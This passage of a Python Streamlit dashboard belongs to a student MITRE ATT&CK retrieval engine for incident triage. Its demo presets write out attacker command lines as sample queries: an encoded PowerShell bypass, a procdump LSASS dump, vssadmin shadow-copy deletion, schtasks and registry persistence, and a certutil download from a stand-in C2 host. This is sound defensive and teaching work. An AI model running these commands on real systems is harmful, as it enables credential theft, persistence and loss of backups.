"""
ThreatMatch: Automated Cyber Threat Intelligence & MITRE ATT&CK Retrieval Engine
Streamlit Web Dashboard for Security Operations Center (SOC) Incident Triage & IR Benchmarking.
Course: Information Retrieval (CSDC 7023) - Mumbai University BE Computer Engineering, Sem-VII
"""

import os
import json
import time
import types
import importlib
import pandas as pd
import streamlit as st

import threatmatch.engine
from threatmatch.engine import ThreatMatchEngine


# Page Configuration
st.set_page_config(
    page_title="ThreatMatch | MITRE ATT&CK Retrieval Engine",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS for Cyber Threat Intelligence Aesthetic
st.markdown("""
<style>
    /* Dark Cybersecurity Modern Theme */
    .stApp {
        background-color: #0b0f19;
        color: #e2e8f0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    .main-header {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        border: 1px solid #334155;
        border-radius: 12px;
        padding: 22px 26px;
        margin-bottom: 20px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
    }
    
    .tech-card {
        background: #131d31;
        border: 1px solid #233554;
        border-left: 5px solid #00d2ff;
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 16px;
        transition: transform 0.15s ease, border-color 0.15s ease;
    }
    .tech-card:hover {
        border-color: #38bdf8;
        box-shadow: 0 6px 20px rgba(0, 210, 255, 0.15);
    }

    /* 4-Way Comparison Compact Cards */
    .compare-card {
        background: #131d31;
        border: 1px solid #233554;
        border-radius: 8px;
        padding: 14px;
        margin-bottom: 14px;
        font-size: 0.88rem;
        transition: transform 0.12s ease, border-color 0.12s ease;
    }
    .compare-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
    }
    .border-bm25 {
        border-left: 5px solid #38bdf8;
    }
    .border-dense {
        border-left: 5px solid #c084fc;
    }
    .border-hybrid {
        border-left: 5px solid #f59e0b;
    }
    .border-prf {
        border-left: 5px solid #10b981;
    }
    
    .badge-tag {
        display: inline-block;
        padding: 3px 9px;
        border-radius: 6px;
        font-size: 0.76rem;
        font-weight: 600;
        margin-right: 5px;
        margin-bottom: 5px;
    }
    .badge-tactic {
        background-color: #1e3a8a;
        color: #93c5fd;
        border: 1px solid #2563eb;
    }
    .badge-tech-id {
        background-color: #065f46;
        color: #6ee7b7;
        border: 1px solid #059669;
        font-family: monospace;
    }
    .badge-score {
        background-color: #701a75;
        color: #f0abfc;
        border: 1px solid #a21caf;
    }
    .badge-token {
        background-color: #334155;
        color: #f8fafc;
        border: 1px solid #475569;
        font-family: monospace;
    }
    .badge-danger {
        background-color: #7f1d1d;
        color: #fca5a5;
        border: 1px solid #b91c1c;
    }

    /* Rank Shift Badges */
    .shift-tag {
        display: inline-block;
        padding: 2px 7px;
        border-radius: 4px;
        font-size: 0.72rem;
        font-weight: 600;
        margin-right: 4px;
        margin-top: 4px;
    }
    .shift-up {
        background-color: #064e3b;
        color: #6ee7b7;
        border: 1px solid #059669;
    }
    .shift-down {
        background-color: #7f1d1d;
        color: #fca5a5;
        border: 1px solid #b91c1c;
    }
    .shift-same {
        background-color: #1e293b;
        color: #94a3b8;
        border: 1px solid #475569;
    }
    .shift-new {
        background-color: #4c1d95;
        color: #d8b4fe;
        border: 1px solid #7c3aed;
    }

    .stat-box {
        background: #1e293b;
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 12px;
        text-align: center;
        margin-bottom: 12px;
    }
    .stat-val {
        font-size: 1.4rem;
        font-weight: 700;
        color: #38bdf8;
    }
    .stat-label {
        font-size: 0.75rem;
        color: #94a3b8;
        text-transform: uppercase;
        letter-spacing: 0.05em;
    }

    .sandbox-panel {
        background: #111827;
        border: 1px solid #1f2937;
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 16px;
    }
    .callout-box {
        background: #0f172a;
        border: 1px solid #38bdf8;
        border-left: 5px solid #38bdf8;
        border-radius: 8px;
        padding: 14px 18px;
        margin-bottom: 16px;
    }
</style>
""", unsafe_allow_html=True)

# Cache Engine Loading so UI re-renders are lightning fast
@st.cache_resource(show_spinner="Booting ThreatMatch Retrieval Engine & Indexes...")
def get_engine():
    import threatmatch.engine
    return threatmatch.engine.ThreatMatchEngine(
        corpus_path="data/mitre_attack_corpus.json",
        cache_dir="data/cache"
    )

def ensure_engine():
    """Validates the cached engine instance and recovers if stale or missing methods."""
    eng = get_engine()
    required_methods = ["compare_all_modes", "search", "explain_bm25", "compare_tokenization"]
    if any(not hasattr(eng, m) for m in required_methods):
        st.cache_resource.clear()
        importlib.reload(threatmatch.engine)
        eng = get_engine()
        # Bind any missing method from the reloaded class as fallback
        for m in required_methods:
            if not hasattr(eng, m) and hasattr(threatmatch.engine.ThreatMatchEngine, m):
                setattr(eng, m, types.MethodType(getattr(threatmatch.engine.ThreatMatchEngine, m), eng))
    return eng

@st.cache_data
def get_benchmark_data():
    bench_path = "data/benchmark_results.json"
    if os.path.exists(bench_path):
        with open(bench_path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

engine = ensure_engine()

benchmark_data = get_benchmark_data()

# Academic Scenarios & Examiner Demo Presets
EXAMINER_SCENARIOS = {
    "powershell_obfuscated": {
        "title": "⚡ Obfuscated PowerShell (Tokenizer & Flag Test)",
        "short_name": "Obfuscated PowerShell",
        "icon": "⚡",
        "category": "Tokenizer & Lexical Precision",
        "target_tech": "T1059.001",
        "target_name": "Command and Scripting Interpreter: PowerShell",
        "query": "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking hidden script",
        "why_important": "Standard NLP tokenizers strip hyphens ('-NoProfile') and slash delimiters, destroying encoded payloads. CyberRegexTokenizer preserves CLI flags and Base64 tokens intact, enabling BM25 to achieve top precision on T1059.001."
    },
    "vocab_mismatch": {
        "title": "🧠 Vocabulary Mismatch (Dense Semantic Test)",
        "short_name": "Vocabulary Mismatch",
        "icon": "🧠",
        "category": "Dense Semantic Retrieval",
        "target_tech": "T1055",
        "target_name": "Process Injection",
        "query": "Stealthily injecting foreign executable code into running background process memory to evade antivirus",
        "why_important": "The query contains zero exact lexical keyword overlap with MITRE's technique title, causing lexical BM25 to rank it poorly. Dense FAISS 384-d embeddings capture conceptual intent and map directly to Process Injection (T1055)."
    },
    "short_rocchio": {
        "title": "✨ Short Query (Rocchio PRF Expansion Test)",
        "short_name": "Short Query Rocchio",
        "icon": "✨",
        "category": "Query Expansion & Feedback",
        "target_tech": "T1003.001",
        "target_name": "OS Credential Dumping: LSASS Memory",
        "query": "procdump lsass",
        "why_important": "Vague 2-word SOC query gives sparse BM25 signal. Rocchio Pseudo-Relevance Feedback extracts high-weight domain terms (mimikatz, memory, dump, sekurlsa, password) to expand the query and elevate T1003.001 to Rank #1."
    },
    "cve_zeroday": {
        "title": "🎯 Exact CVE WebKit Memory Corruption (IoC & Exploit Test)",
        "short_name": "Exact CVE WebKit",
        "icon": "🎯",
        "category": "IoC Preservation & Precision",
        "target_tech": "T1203",
        "target_name": "Exploitation for Client Execution",
        "query": "CVE-2023-38606 WebKit memory corruption vulnerability allowing arbitrary code execution in mobile browser",
        "why_important": "Standard tokenizers split hyphenated CVE numbers into disjoint tokens. CyberRegexTokenizer locks onto the exact CVE token and exploit semantics, mapping to T1203 (Client Execution) and T1189 (Drive-by)."
    },
    "ransomware_multi": {
        "title": "🛡️ Ransomware Multi-Stage (Hybrid RRF Test)",
        "short_name": "Ransomware Multi-Stage",
        "icon": "🛡️",
        "category": "Hybrid Fusion Synergy",
        "target_tech": "T1490",
        "target_name": "Inhibit System Recovery",
        "query": "vssadmin.exe delete shadows /all /quiet and bcdedit /set default bootstatuspolicy ignoreallfailures followed by file encryption",
        "why_important": "Combines hard command-line syntax (vssadmin delete shadows) and conceptual behavior (file encryption). Demonstrates how Reciprocal Rank Fusion synthesizes sparse lexical precision and dense semantic vectors."
    }
}

INCIDENT_PRESETS = {
    "Select a pre-configured scenario...": "",
    "1. Encoded PowerShell Execution (T1059.001)": (
        "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand aW1wb3J0 invoking hidden script"
    ),
    "2. LSASS Memory Credential Dump (T1003.001)": (
        "Adversary executed procdump.exe -ma lsass.exe lsass.dmp to extract plaintext passwords and hashes"
    ),
    "3. Process Injection into svchost (T1055.001)": (
        "Adversary injected malicious DLL into svchost.exe memory space via CreateRemoteThread API"
    ),
    "4. Scheduled Task Logon Persistence (T1053.005)": (
        "schtasks /create /tn SecurityUpdater /tr C:\\Windows\\Temp\\updater.bat /sc onlogon"
    ),
    "5. Registry Run Keys Persistence (T1547.001)": (
        "Registry persistence added at HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run payload.exe"
    ),
    "6. Ransomware Volume Shadow Deletion (T1490)": (
        "vssadmin.exe delete shadows /all /quiet executed before file encryption"
    ),
    "7. Kerberoasting SPN Ticket Request (T1558.003)": (
        "Requesting Kerberos Service Principal Name ticket with RC4 encryption to crack offline password hash"
    ),
    "8. Ingress Remote Payload Download (T1105)": (
        "certutil.exe -urlcache -split -f http://malicious-c2.net/payload.exe payload.exe"
    )
}

# Initialize Streamlit Session State for Interactivity
if "global_query" not in st.session_state:
    st.session_state["global_query"] = EXAMINER_SCENARIOS["powershell_obfuscated"]["query"]
if "active_scenario_key" not in st.session_state:
    st.session_state["active_scenario_key"] = "powershell_obfuscated"

# Parameter State Defaults
if "bm25_k1" not in st.session_state:
    st.session_state["bm25_k1"] = 1.5
if "bm25_b" not in st.session_state:
    st.session_state["bm25_b"] = 0.75
if "rrf_k" not in st.session_state:
    st.session_state["rrf_k"] = 60
if "prf_alpha" not in st.session_state:
    st.session_state["prf_alpha"] = 1.0
if "prf_beta" not in st.session_state:
    st.session_state["prf_beta"] = 0.75
if "prf_k_docs" not in st.session_state:
    st.session_state["prf_k_docs"] = 3
if "prf_num_terms" not in st.session_state:
    st.session_state["prf_num_terms"] = 5

for _k, _def in [
    ("sandbox_k1", 1.5),
    ("sandbox_b", 0.75),
    ("sandbox_rrf_k", 60),
    ("sandbox_alpha", 1.0),
    ("sandbox_beta", 0.75),
    ("sandbox_k_docs", 3),
    ("sandbox_num_terms", 5),
    ("compare_query_textarea", EXAMINER_SCENARIOS["powershell_obfuscated"]["query"]),
    ("sandbox_query_input", EXAMINER_SCENARIOS["powershell_obfuscated"]["query"]),
    ("triage_query_input", EXAMINER_SCENARIOS["powershell_obfuscated"]["query"]),
    ("triage_preset_selectbox", "Select a pre-configured scenario...")
]:
    if _k not in st.session_state:
        st.session_state[_k] = _def

# Helper: Synchronize query inputs and presets across tabs safely via callbacks
def select_scenario_callback(s_key: str, query_text: str):
    st.session_state["global_query"] = query_text
    st.session_state["active_scenario_key"] = s_key
    st.session_state["compare_query_textarea"] = query_text
    st.session_state["sandbox_query_input"] = query_text
    st.session_state["triage_query_input"] = query_text
    if "triage_preset_selectbox" in st.session_state:
        st.session_state["triage_preset_selectbox"] = "Select a pre-configured scenario..."

def on_compare_query_change():
    new_q = st.session_state.get("compare_query_textarea", "")
    st.session_state["global_query"] = new_q
    st.session_state["sandbox_query_input"] = new_q
    st.session_state["triage_query_input"] = new_q
    st.session_state["active_scenario_key"] = None
    if "triage_preset_selectbox" in st.session_state:
        st.session_state["triage_preset_selectbox"] = "Select a pre-configured scenario..."

def on_sandbox_query_change():
    new_q = st.session_state.get("sandbox_query_input", "")
    st.session_state["global_query"] = new_q
    st.session_state["compare_query_textarea"] = new_q
    st.session_state["triage_query_input"] = new_q
    st.session_state["active_scenario_key"] = None
    if "triage_preset_selectbox" in st.session_state:
        st.session_state["triage_preset_selectbox"] = "Select a pre-configured scenario..."

def on_triage_query_change():
    new_q = st.session_state.get("triage_query_input", "")
    st.session_state["global_query"] = new_q
    st.session_state["compare_query_textarea"] = new_q
    st.session_state["sandbox_query_input"] = new_q
    st.session_state["active_scenario_key"] = None
    if "triage_preset_selectbox" in st.session_state:
        st.session_state["triage_preset_selectbox"] = "Select a pre-configured scenario..."

def on_triage_preset_change():
    chosen = st.session_state.get("triage_preset_selectbox")
    if chosen and chosen != "Select a pre-configured scenario...":
        preset_q = INCIDENT_PRESETS[chosen]
        st.session_state["global_query"] = preset_q
        st.session_state["compare_query_textarea"] = preset_q
        st.session_state["sandbox_query_input"] = preset_q
        st.session_state["triage_query_input"] = preset_q
        st.session_state["active_scenario_key"] = None

# Helper: Render 1-Click Examiner Demo Scenarios Bar
def render_examiner_demo_bar(prefix: str):
    st.markdown("#### 🎯 1-Click Examiner Demo Scenarios")
    st.caption("Click any scenario to immediately load representative CTI telemetry and evaluate retrieval behavior across baselines.")
    btn_cols = st.columns(len(EXAMINER_SCENARIOS))
    for col, (s_key, s_data) in zip(btn_cols, EXAMINER_SCENARIOS.items()):
        with col:
            is_active = (st.session_state.get("active_scenario_key") == s_key)
            btn_label = f"{s_data['icon']} {s_data['short_name']}"
            st.button(
                btn_label,
                key=f"{prefix}_sc_btn_{s_key}",
                help=f"{s_data['category']} - Target: {s_data['target_tech']}",
                use_container_width=True,
                type="primary" if is_active else "secondary",
                on_click=select_scenario_callback,
                args=(s_key, s_data["query"])
            )

    # Active scenario callout
    act_key = st.session_state.get("active_scenario_key")
    if act_key and act_key in EXAMINER_SCENARIOS:
        sc = EXAMINER_SCENARIOS[act_key]
        st.markdown(f"""
        <div class="callout-box">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
                <span style="font-weight: 700; color: #38bdf8; font-size: 1.05rem;">{sc['title']}</span>
                <span class="badge-tag badge-tactic">{sc['category']}</span>
            </div>
            <div style="font-size: 0.9rem; color: #cbd5e1; margin-bottom: 8px;">
                <b>Expected Target:</b> <span class="badge-tag badge-tech-id">{sc['target_tech']}</span> <b>{sc['target_name']}</b>
            </div>
            <div style="font-size: 0.85rem; color: #94a3b8; line-height: 1.45;">
                <b>Examiner IR Concept:</b> {sc['why_important']}
            </div>
        </div>
        """, unsafe_allow_html=True)

# Sidebar Controls
st.sidebar.title("🛡️ ThreatMatch Config")
st.sidebar.caption("CSDC 7023: Information Retrieval Engine")

search_mode = st.sidebar.selectbox(
    "Primary Pipeline Strategy",
    [
        "Hybrid Fusion + Rocchio PRF",
        "Hybrid Fusion (RRF)",
        "Pure BM25 (Okapi)",
        "Pure Dense (FAISS)"
    ],
    index=0,
    help="Select IR strategy for Incident Triage: BM25 lexical, Dense FAISS semantic, or Hybrid Reciprocal Rank Fusion."
)

mode_map = {
    "Hybrid Fusion + Rocchio PRF": "hybrid_prf",
    "Hybrid Fusion (RRF)": "hybrid",
    "Pure BM25 (Okapi)": "bm25",
    "Pure Dense (FAISS)": "dense"
}

st.sidebar.markdown("---")
st.sidebar.subheader("Engine Hyperparameters")
top_k_slider = st.sidebar.slider("Top-k Retrieved Techniques", min_value=3, max_value=25, value=10, step=1)

with st.sidebar.expander("⚙️ Active IR Hyperparameters", expanded=True):
    st.markdown(f"""
    - **BM25 $k_1$:** `{float(st.session_state.get('bm25_k1', 1.5)):.2f}`
    - **BM25 $b$:** `{float(st.session_state.get('bm25_b', 0.75)):.2f}`
    - **RRF $k$:** `{int(st.session_state.get('rrf_k', 60))}`
    - **Rocchio $\\alpha$:** `{float(st.session_state.get('prf_alpha', 1.0)):.2f}`
    - **Rocchio $\\beta$:** `{float(st.session_state.get('prf_beta', 0.75)):.2f}`
    - **Feedback Docs ($k_{{docs}}$):** `{int(st.session_state.get('prf_k_docs', 3))}`
    - **Expansion Terms:** `{int(st.session_state.get('prf_num_terms', 5))}`
    """)
    st.caption("💡 Adjust and experiment in real time within the **🎛️ IR Parameter Sandbox** tab.")

st.sidebar.markdown("---")
st.sidebar.markdown(f"**Indexed Techniques:** `{len(engine.techniques)}`")
st.sidebar.markdown(f"**Vocabulary Size:** `{len(engine.index.postings):,}` terms")
st.sidebar.markdown(f"**Dense Dimension:** `{engine.dense.DIMENSION}`-d")
st.sidebar.caption("MITRE ATT&CK Enterprise STIX 2.1")

# Main Header Banner
st.markdown("""
<div class="main-header">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <div>
            <h1 style="margin: 0; color: #38bdf8; font-size: 2.1rem;">ThreatMatch</h1>
            <p style="margin: 5px 0 0 0; color: #94a3b8; font-size: 1.05rem;">
                Automated Cyber Threat Intelligence & MITRE ATT&CK Retrieval Engine
            </p>
        </div>
        <div style="text-align: right;">
            <span class="badge-tag badge-tech-id">CSDC 7023</span>
            <span class="badge-tag badge-tactic">Sem-VII Mini-Project</span>
            <span class="badge-tag badge-score">Sub-Second Triage</span>
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

# Navigation Tabs: Boost 1 (4-Way Comparison), Boost 2 (IR Parameter Sandbox), Boost 3 (1-Click Examiner Demos)
tab_compare, tab_sandbox, tab_triage, tab_tokenizer, tab_benchmark, tab_corpus = st.tabs([
    "🔀 4-Way Baseline Comparison",
    "🎛️ IR Parameter Sandbox",
    "🔍 Incident Triage & Search",
    "🧪 CyberRegex Tokenizer Inspector",
    "📊 Benchmarking & IR Metrics",
    "📚 MITRE ATT&CK Corpus"
])

# -------------------------------------------------------------
# TAB 1: 4-WAY SIDE-BY-SIDE BASELINE COMPARISON TAB (BOOST 1 & 3)
# -------------------------------------------------------------
with tab_compare:
    st.subheader("4-Way Baseline Retrieval Comparison (Top-5 Techniques)")
    st.caption("Side-by-side simultaneous comparison of all 4 baseline strategies (Pure BM25, Pure Dense FAISS, Hybrid RRF, and Hybrid + PRF) on the exact same query with cross-method rank shift tracking.")

    # 1-Click Examiner Demo Scenarios Bar
    render_examiner_demo_bar(prefix="compare")

    # Query Input Box
    cmp_query = st.text_area(
        "Incident Telemetry / Query for 4-Way Comparison:",
        height=75,
        key="compare_query_textarea",
        on_change=on_compare_query_change
    )

    if cmp_query:
        with st.spinner("Executing 4-way comparative retrieval across all pipelines..."):
            if not hasattr(engine, "compare_all_modes"):
                engine = ensure_engine()
            comp_res = engine.compare_all_modes(
                query=cmp_query,
                top_k=5,
                bm25_k1=st.session_state["bm25_k1"],
                bm25_b=st.session_state["bm25_b"],
                rrf_k=st.session_state["rrf_k"],
                prf_alpha=st.session_state["prf_alpha"],
                prf_beta=st.session_state["prf_beta"],
                prf_k_docs=st.session_state["prf_k_docs"],
                prf_num_terms=st.session_state["prf_num_terms"]
            )

        # Overview Metrics Banner
        m = comp_res["metrics"]
        st.markdown("### Cross-Pipeline Consensus & Performance Metrics")
        om1, om2, om3, om4 = st.columns(4)
        with om1:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val">{m['total_pipeline_latency_ms']:.1f} ms</div>
                <div class="stat-label">Total 4-Way Execution Latency</div>
            </div>
            """, unsafe_allow_html=True)
        with om2:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val" style="color: #38bdf8;">{m['jaccard_bm25_dense']:.2f}</div>
                <div class="stat-label">Jaccard (BM25 vs Dense)</div>
            </div>
            """, unsafe_allow_html=True)
        with om3:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val" style="color: #4ade80;">{m['jaccard_hybrid_prf']:.2f}</div>
                <div class="stat-label">Jaccard (Hybrid vs PRF)</div>
            </div>
            """, unsafe_allow_html=True)
        with om4:
            st.markdown(f"""
            <div class="stat-box">
                <div class="stat-val" style="color: #c084fc;">{m['all_four_consensus_count']}</div>
                <div class="stat-label">Full 4-Way Unanimous Top-5 Hits</div>
            </div>
            """, unsafe_allow_html=True)

        # 4-Column Layout
        c1, c2, c3, c4 = st.columns(4)

        # Helper to format cards
        def render_compact_card(r: dict, border_class: str, shift_badges_html: str, score_label: str):
            tech_id = r["id"]
            name = r["name"]
            score = r["score"]
            rank = r["rank"]
            url = r.get("url", f"https://attack.mitre.org/techniques/{tech_id.replace('.', '/')}")
            tactics = r.get("tactics", [])
            tactic_chips = " ".join([f'<span class="badge-tag badge-tactic">{t}</span>' for t in tactics[:2]])
            
            st.markdown(f"""
            <div class="compare-card {border_class}">
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <div>
                        <span class="badge-tag badge-tech-id">#{rank} | {tech_id}</span>
                        <a href="{url}" target="_blank" style="color: #38bdf8; font-weight: 700; text-decoration: none; font-size: 0.95rem;">
                            {name[:28]}{'...' if len(name) > 28 else ''} ↗
                        </a>
                    </div>
                </div>
                <div style="margin-top: 6px;">{tactic_chips}</div>
                <div style="margin-top: 6px; font-size: 0.82rem; color: #cbd5e1;">
                    <b>{score_label}:</b> <span class="badge-tag badge-score">{score:.4f}</span>
                </div>
                <div style="margin-top: 6px;">
                    {shift_badges_html}
                </div>
            </div>
            """, unsafe_allow_html=True)

        # Column 1: Pure BM25
        with c1:
            st.markdown(f"""
            <div style="background:#0f172a; padding:10px; border-radius:8px; border-top: 3px solid #38bdf8; margin-bottom:12px;">
                <h4 style="margin:0; color:#38bdf8;">🔵 Pure BM25 (Okapi)</h4>
                <div style="font-size:0.8rem; color:#94a3b8;">Lexical Inverted Index | Latency: <b>{comp_res['bm25']['latency_ms']:.1f}ms</b></div>
            </div>
            """, unsafe_allow_html=True)
            for r in comp_res["bm25"]["results"]:
                tag_html = '<span class="shift-tag shift-same">🏷️ Pure Lexical Baseline</span>'
                render_compact_card(r, "border-bm25", tag_html, "BM25 Score")

        # Column 2: Pure Dense FAISS
        with c2:
            st.markdown(f"""
            <div style="background:#0f172a; padding:10px; border-radius:8px; border-top: 3px solid #c084fc; margin-bottom:12px;">
                <h4 style="margin:0; color:#c084fc;">🟣 Pure Dense (FAISS)</h4>
                <div style="font-size:0.8rem; color:#94a3b8;">Semantic 384-d | Latency: <b>{comp_res['dense']['latency_ms']:.1f}ms</b></div>
            </div>
            """, unsafe_allow_html=True)
            for r in comp_res["dense"]["results"]:
                shift = r.get("shift_vs_bm25")
                b_rank = r.get("bm25_rank")
                if b_rank is None:
                    shift_html = '<span class="shift-tag shift-new">★ Rescued (Not in BM25 Top-5)</span>'
                elif shift > 0:
                    shift_html = f'<span class="shift-tag shift-up">▲ +{shift} vs BM25 (#{b_rank})</span>'
                elif shift < 0:
                    shift_html = f'<span class="shift-tag shift-down">▼ {abs(shift)} vs BM25 (#{b_rank})</span>'
                else:
                    shift_html = f'<span class="shift-tag shift-same">● Exact Rank Match (#{b_rank})</span>'
                render_compact_card(r, "border-dense", shift_html, "Cosine Sim")

        # Column 3: Hybrid Fusion (RRF)
        with c3:
            st.markdown(f"""
            <div style="background:#0f172a; padding:10px; border-radius:8px; border-top: 3px solid #f59e0b; margin-bottom:12px;">
                <h4 style="margin:0; color:#f59e0b;">🟠 Hybrid Fusion (RRF)</h4>
                <div style="font-size:0.8rem; color:#94a3b8;">Reciprocal Rank Fusion | Latency: <b>{comp_res['hybrid']['latency_ms']:.1f}ms</b></div>
            </div>
            """, unsafe_allow_html=True)
            for r in comp_res["hybrid"]["results"]:
                b_shift = r.get("shift_vs_bm25")
                d_shift = r.get("shift_vs_dense")
                b_rk = r.get("bm25_rank")
                d_rk = r.get("dense_rank")

                if b_rk is None:
                    b_badge = '<span class="shift-tag shift-new">BM25: >5</span>'
                elif b_shift > 0:
                    b_badge = f'<span class="shift-tag shift-up">▲ +{b_shift} vs BM25 (#{b_rk})</span>'
                elif b_shift < 0:
                    b_badge = f'<span class="shift-tag shift-down">▼ {abs(b_shift)} vs BM25 (#{b_rk})</span>'
                else:
                    b_badge = f'<span class="shift-tag shift-same">● Match BM25 (#{b_rk})</span>'

                if d_rk is None:
                    d_badge = '<span class="shift-tag shift-new">Dense: >5</span>'
                elif d_shift > 0:
                    d_badge = f'<span class="shift-tag shift-up">▲ +{d_shift} vs Dense (#{d_rk})</span>'
                elif d_shift < 0:
                    d_badge = f'<span class="shift-tag shift-down">▼ {abs(d_shift)} vs Dense (#{d_rk})</span>'
                else:
                    d_badge = f'<span class="shift-tag shift-same">● Match Dense (#{d_rk})</span>'

                shifts_html = f"<div>{b_badge}</div><div style='margin-top:2px;'>{d_badge}</div>"
                render_compact_card(r, "border-hybrid", shifts_html, "RRF Score")

        # Column 4: Hybrid + Rocchio PRF
        with c4:
            st.markdown(f"""
            <div style="background:#0f172a; padding:10px; border-radius:8px; border-top: 3px solid #10b981; margin-bottom:12px;">
                <h4 style="margin:0; color:#10b981;">🟢 Hybrid + Rocchio PRF</h4>
                <div style="font-size:0.8rem; color:#94a3b8;">2-Pass Feedback | Latency: <b>{comp_res['hybrid_prf']['latency_ms']:.1f}ms</b></div>
            </div>
            """, unsafe_allow_html=True)
            for r in comp_res["hybrid_prf"]["results"]:
                h_shift = r.get("shift_vs_hybrid")
                h_rk = r.get("hybrid_rank")
                if h_rk is None:
                    shift_html = '<span class="shift-tag shift-new">★ Discovered by PRF</span>'
                elif h_shift > 0:
                    shift_html = f'<span class="shift-tag shift-up">▲ +{h_shift} Boosted by PRF (was #{h_rk})</span>'
                elif h_shift < 0:
                    shift_html = f'<span class="shift-tag shift-down">▼ {abs(h_shift)} vs Hybrid (#{h_rk})</span>'
                else:
                    shift_html = f'<span class="shift-tag shift-same">● Stable Top-1 (#{h_rk})</span>'
                render_compact_card(r, "border-prf", shift_html, "Blended Score")

        # PRF Query Expansion Summary Box
        prf_info = comp_res["hybrid_prf"].get("prf_info")
        if prf_info and prf_info.get("expansion_terms"):
            with st.expander("✨ Discovered Rocchio PRF Expansion Terms & Formula Decomposition", expanded=False):
                st.markdown(f"**Original Query:** `{prf_info['original_query']}`")
                st.markdown(f"**Enriched Query ($Q_{{new}}$):** `{prf_info['expanded_query']}`")
                st.markdown(f"**Pseudo-Relevant Docs Used ($|D_r|={prf_info['k_feedback']}$):** " +
                            ", ".join([f"`{d}` ({n})" for d, n in zip(prf_info['feedback_doc_ids'], prf_info['feedback_doc_names'])]))
                terms_chips = " ".join([f'<span class="badge-tag badge-score">+{t["term"]} (w={t["weight"]:.3f}, IDF={t["idf"]:.2f})</span>' for t in prf_info["expansion_terms"]])
                st.markdown(terms_chips, unsafe_allow_html=True)
                st.caption(f"Applied: q_new = {prf_info['alpha']} * q0 + ({prf_info['beta']} / {prf_info['k_feedback']}) * sum(d in Dr)")

        # Cross-Method Consensus & Rank Shift Matrix Table
        st.markdown("---")
        st.subheader("Cross-Method Consensus & Rank Shift Matrix")
        st.caption("Tracks how every retrieved technique is positioned across each of the 4 models simultaneously.")

        matrix_df = pd.DataFrame(comp_res["comparison_matrix"])
        matrix_df.columns = ["Technique ID", "Technique Name", "MITRE Tactics", "BM25 Rank", "Dense Rank", "Hybrid RRF Rank", "Hybrid+PRF Rank", "Status Attribution"]
        matrix_df = matrix_df.astype(str)
        st.dataframe(matrix_df, use_container_width=True, hide_index=True)

# -------------------------------------------------------------
# TAB 2: INTERACTIVE IR PARAMETER SANDBOX (BOOST 2 & 3)
# -------------------------------------------------------------
with tab_sandbox:
    st.subheader("Interactive Information Retrieval Parameter Sandbox")
    st.caption("Adjust Okapi BM25 term saturation ($k_1$), document length normalization ($b$), Reciprocal Rank Fusion smoothing ($k$), and Rocchio PRF weights ($\\alpha, \\beta, k_{docs}$) to evaluate IR dynamics in real time.")

    # 1-Click Examiner Demo Scenarios Bar
    render_examiner_demo_bar(prefix="sandbox")

    st.markdown("### 🎛️ Sandbox Parameter Sliders")
    sb_col1, sb_col2, sb_col3 = st.columns(3)

    with sb_col1:
        st.markdown("""
        <div class="sandbox-panel" style="border-top: 3px solid #38bdf8;">
            <h4 style="margin: 0; color: #38bdf8;">1. Okapi BM25 Lexical Model</h4>
            <p style="margin: 4px 0 12px 0; font-size: 0.8rem; color: #94a3b8;">Controls term saturation and document length penalty.</p>
        </div>
        """, unsafe_allow_html=True)
        box_k1 = st.slider(
            "BM25 k1 (Term Frequency Saturation)",
            min_value=0.1, max_value=3.0, value=float(st.session_state.get("sandbox_k1", 1.5)), step=0.05,
            key="sandbox_k1",
            help="Higher k1 allows repeated terms to continually increase score. Lower k1 saturates quickly."
        )
        box_b = st.slider(
            "BM25 b (Document Length Penalty)",
            min_value=0.0, max_value=1.0, value=float(st.session_state.get("sandbox_b", 0.75)), step=0.05,
            key="sandbox_b",
            help="b=1.0 completely penalizes verbose documents. b=0.0 turns off document length normalization."
        )
        st.latex(r"\text{TF}_{\text{BM25}} = \frac{f(t, D) \cdot (k_1 + 1)}{f(t, D) + k_1 \cdot \left(1 - b + b \cdot \frac{|D|}{\text{avgdl}}\right)}")

    with sb_col2:
        st.markdown("""
        <div class="sandbox-panel" style="border-top: 3px solid #f59e0b;">
            <h4 style="margin: 0; color: #f59e0b;">2. Reciprocal Rank Fusion (RRF)</h4>
            <p style="margin: 4px 0 12px 0; font-size: 0.8rem; color: #94a3b8;">Smoothing parameter balancing top vs tail ranks.</p>
        </div>
        """, unsafe_allow_html=True)
        box_rrf_k = st.slider(
            "RRF Smoothing Factor (k)",
            min_value=1, max_value=100, value=int(st.session_state.get("sandbox_rrf_k", 60)), step=1,
            key="sandbox_rrf_k",
            help="Standard Cormack constant is 60. Smaller k puts heavier weight on rank #1 vs #5."
        )
        st.caption(f"Score for rank #1: 1/({box_rrf_k}+1) = **{1.0/(box_rrf_k+1):.4f}** | Rank #5: 1/({box_rrf_k}+5) = **{1.0/(box_rrf_k+5):.4f}**")
        st.latex(r"\text{RRF}(d) = \sum_{m \in \{\text{BM25}, \text{Dense}\}} \frac{1}{k + r_m(d)}")

    with sb_col3:
        st.markdown("""
        <div class="sandbox-panel" style="border-top: 3px solid #10b981;">
            <h4 style="margin: 0; color: #10b981;">3. Rocchio PRF Reformulation</h4>
            <p style="margin: 4px 0 12px 0; font-size: 0.8rem; color: #94a3b8;">Controls vector arithmetic for query enrichment.</p>
        </div>
        """, unsafe_allow_html=True)
        box_alpha = st.slider(
